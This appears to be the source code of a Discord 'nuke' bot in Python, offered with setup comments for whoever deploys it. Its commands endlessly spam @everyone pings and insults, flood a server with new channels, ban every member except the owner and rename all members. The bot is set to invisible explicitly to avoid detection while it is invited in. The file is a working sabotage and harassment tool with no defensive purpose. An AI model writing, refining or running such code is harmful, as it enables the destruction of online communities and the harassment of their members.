# Created by Cipherprobe on Github
# IMPORTANT: Read the README file and the instructions


import discord
from discord.ext import commands
import time


# Client
bot = commands.Bot(command_prefix='Insert your custom prefix here')

# Extra processes
bot.remove_command('help')


# Ping everyone with a delay time of your choice
@bot.command(brief='', description='')
async def everyone(context):
    await context.message.delete()
    while True:  # WARNING: This loop may crash the bot. In order to avoid crashing, the time delay is recommended.
        await context.send('@everyone')
        time.sleep(3) # Here, you can change the number '5' to the amount of seconds of your choice. Based on what you put, there will be a delay of that many seconds between each @everyone ping

# Spam channels
@bot.command(brief='', description='')
async def channels(context):
    await context.message.delete()
    guild = context.message.guild
    while True: # It will end at the limit, do not worry about it crashing
        await guild.create_text_channel('malibot') # You can change the name of the channels by editing the 'malibot' part.

# Ban everyone
@bot.command(brief='', description='')
async def ban(context, *, reason=None):
    for member in context.guild.members:
        if member != context.guild.owner:
            await member.ban(reason=reason)
            await context.send(f"**{member.display_name}** was banned")
            print(f"Banned {member.display_name} and invite links were sent.")
    print("Banning complete!")

# Spam command
@bot.command(brief='', description='')
async def spam(context):
    while True: # WARNING: This loop may crash the bot. In order to avoid crashing, the time delay is recommended.
        await context.send('@everyone You are an idiot')
        time.sleep(3) # You can change the number '5' to the amount of seconds you want the messages to be delayed.

# Change every member's nickname
@bot.command(brief='', description='')
async def chnick(context, nick):
    for member in context.guild.members:
        if member != context.guild.owner:
            await member.edit(nick = nick)

# Determining bot status. NOTE: In order to avoid being caught while inviting the bot, keep the status at Invisible. Do not edit the code.
@bot.event
async def on_ready():

    await bot.change_presence(status=discord.Status.invisible, activity=discord.Game('Blood for the blood god'))


# Run the bot.
bot.run('Insert your bot token here')
